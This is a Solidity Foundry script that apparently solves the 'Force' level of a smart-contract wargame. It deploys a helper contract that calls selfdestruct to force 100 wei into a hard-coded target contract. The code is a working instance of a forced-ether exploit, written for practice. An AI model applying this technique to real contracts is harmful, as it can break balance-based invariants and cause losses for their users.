// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Force} from "../src/L7Force.sol";

contract L7ForceAttack is Script, Broadcast {
    SelfDestruct selfDestruct;

    function run() public broadcast {
        selfDestruct = new SelfDestruct(payable(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D));

        (bool success,) = address(selfDestruct).call{value: 100 wei}("");
        require(success, "Transfer failed");
    }
}

contract SelfDestruct {
    address payable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    receive() external payable {
        selfdestruct(target);
    }
}
